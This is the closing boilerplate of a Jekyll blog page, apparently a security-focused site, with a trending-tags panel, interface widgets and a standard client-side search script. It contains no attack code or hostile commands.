  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/deserialization/">deserialization</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/android/">android</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/interview/">interview</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/podcast/">podcast</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ato/">ATO</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hacking-lab/">hacking-lab</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/note-taking/">note-taking</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

